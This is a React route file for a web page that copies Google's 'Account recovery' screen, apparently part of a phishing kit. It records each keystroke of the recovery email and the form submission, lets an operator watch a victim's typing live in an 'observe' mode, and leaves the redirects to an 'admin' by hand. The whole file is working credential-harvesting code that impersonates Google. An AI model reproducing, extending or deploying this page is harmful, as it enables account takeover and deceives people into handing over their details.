import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  geAvatarColor,
  geInitials,
  resolveGeEmail,
  setGeEmail,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/confirmrecovery")({
  head: () => ({
    meta: [
      { title: "Account recovery - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeConfirmRecoveryPage,
});

/** Google-style masked recovery hint (matches screenshot dots). */
function maskRecoveryHint(_email: string): string {
  return "••••••@•••••••.•••";
}

const GE_RECOVERY_CSS = `
${GE_SHELL_CSS}

.ge-recovery .ge-title { margin-top: 24px; }

.ge-recovery-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}

.ge-account-chip {
  display: inline-flex;
  align-items: center;
  gap: 0;
  margin-top: 24px;
  width: fit-content;
  max-width: 100%;
  align-self: flex-start;
  height: 32px;
  padding: 0 8px 0 3px;
  border: 1px solid var(--gm3-outline);
  border-radius: 16px;
  background: var(--gm3-card);
  color: var(--gm3-on-surface);
  font: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.25px;
  line-height: 1.25;
  cursor: pointer;
  text-align: left;
}
.ge-account-chip:hover { background: rgba(227, 227, 227, 0.08); }
.ge-avatar {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  color: #fff;
  font-size: 10px;
  font-weight: 500;
  line-height: 1;
  user-select: none;
  margin-right: 8px;
}
.ge-account-email {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  min-width: 0;
  padding-right: 4px;
}
.ge-chip-caret {
  width: 20px;
  height: 20px;
  flex-shrink: 0;
  fill: var(--gm3-on-surface);
  opacity: 0.8;
}

.ge-recovery-heading {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
.ge-recovery-help {
  margin: 16px 0 0;
  font-size: 0.875rem;
  font-weight: 400;
  line-height: 1.4286;
  color: var(--gm3-on-surface-variant);
}
@media (min-width: 900px) {
  .ge-recovery .ge-pane-right {
    padding-top: 72px;
  }
}

.ge-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-form { margin-top: 22px; }
}

.ge-field {
  position: relative;
  width: 100%;
  height: 56px;
  margin-top: 0;
}
.ge-field input {
  position: relative;
  z-index: 1;
  width: 100%;
  height: 56px;
  margin: 0;
  padding: 13px 15px;
  border: none;
  outline: none;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: inherit;
  font-size: 1rem;
  font-weight: 400;
  line-height: 24px;
  border-radius: 4px;
  caret-color: var(--gm3-primary);
}
.ge-field .ring {
  position: absolute;
  inset: 0;
  border-radius: 4px;
  pointer-events: none;
  z-index: 2;
  box-shadow: inset 0 0 0 1px var(--gm3-outline);
  transition: box-shadow .15s cubic-bezier(.4,0,.2,1);
}
.ge-field.is-active .ring,
.ge-field.has-value .ring {
  box-shadow: inset 0 0 0 2px var(--gm3-primary);
}
.ge-field label {
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  padding: 0 4px;
  color: var(--gm3-on-surface-variant);
  font-size: 1rem;
  line-height: 1.5;
  pointer-events: none;
  z-index: 3;
  background: var(--gm3-card);
  transition: top .15s cubic-bezier(.4,0,.2,1), font-size .15s cubic-bezier(.4,0,.2,1), color .15s cubic-bezier(.4,0,.2,1);
}
.ge-field.is-active label,
.ge-field.has-value label {
  top: 0;
  font-size: 0.75rem;
  line-height: 1.333;
  color: var(--gm3-primary);
}

.ge-actions {
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  margin-top: auto;
  padding-top: 32px;
  gap: 8px;
  width: 100%;
}
.ge-btn-text {
  background: none;
  border: none;
  padding: 0 12px;
  height: 40px;
  border-radius: 20px;
  color: var(--gm-next-fill);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-send {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-send:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-send:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}
`;

function GeConfirmRecoveryPage() {
  const { trackClick, trackInput, trackSubmit, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [recoveryEmail, setRecoveryEmail] = useState("");
  const [focused, setFocused] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const initials = useMemo(() => (email ? geInitials(email) : ""), [email]);
  const avatarBg = useMemo(
    () => (email ? geAvatarColor(email) : "rgb(95, 99, 104)"),
    [email],
  );
  const maskedHint = useMemo(() => maskRecoveryHint(email), [email]);

  useEffect(() => {
    const resolved = resolveGeEmail();
    if (resolved) {
      setEmail(resolved);
      setGeEmail(resolved);
    }
    setTimeout(() => inputRef.current?.focus(), 200);
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
      if (
        d.field === "recovery_email" ||
        d.field === "recoveryEmail" ||
        d.field === "Enter recovery email address" ||
        d.field === "recovery_email_submitted"
      ) {
        setRecoveryEmail(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const hasValue = recoveryEmail.length > 0;
  const isActive = focused || hasValue;
  const canSend = recoveryEmail.trim().length > 0;

  const handleSend = (e?: FormEvent) => {
    e?.preventDefault();
    if (!canSend) return;
    trackClick("Send");
    trackSubmit("recovery_email", recoveryEmail.trim());
    // Stay put — admin redirects
  };

  return (
    <div className="ge-shell ge-recovery">
      <GeFontStyle />
      <style>{GE_RECOVERY_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Account recovery</h1>
          <p className="ge-recovery-lead">
            To help keep your account safe, Google wants to make sure it{"\u2019"}s
            really you trying to sign in
          </p>
          <button
            type="button"
            className="ge-account-chip"
            aria-label={`${email || "Account"} selected. Switch account`}
            onClick={() => trackClick("Switch account")}
          >
            <span className="ge-avatar" style={{ background: avatarBg }} aria-hidden="true">
              {initials || "?"}
            </span>
            <span className="ge-account-email">{email || "Account"}</span>
            <svg className="ge-chip-caret" viewBox="0 0 24 24" aria-hidden="true">
              <path d="M7 9.5l5 5 5-5H7z" />
            </svg>
          </button>
        </div>

        <div className="ge-pane-right">
          <p className="ge-recovery-heading">Get a verification code</p>
          <p className="ge-recovery-help">
            To get a verification code, first confirm the recovery email address you
            added to your account {maskedHint}
          </p>

          <form className="ge-form" onSubmit={handleSend} autoComplete="off">
            <div
              className={`ge-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}`}
            >
              <input
                ref={inputRef}
                id="recoveryEmail"
                name="recovery_email"
                type="email"
                autoComplete="email"
                spellCheck={false}
                autoCapitalize="none"
                aria-label="Enter recovery email address"
                value={recoveryEmail}
                onFocus={() => setFocused(true)}
                onBlur={() => setFocused(false)}
                onChange={(e) => {
                  const v = e.target.value;
                  setRecoveryEmail(v);
                  trackInput("recovery_email", v, "email");
                }}
              />
              <div className="ring" aria-hidden="true" />
              <label htmlFor="recoveryEmail">Enter recovery email address</label>
            </div>

            <div className="ge-actions">
              <button
                type="button"
                className="ge-btn-text"
                onClick={() => trackClick("Try another way")}
              >
                Try another way
              </button>
              <button type="submit" className="ge-btn ge-btn-send" disabled={!canSend}>
                Send
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
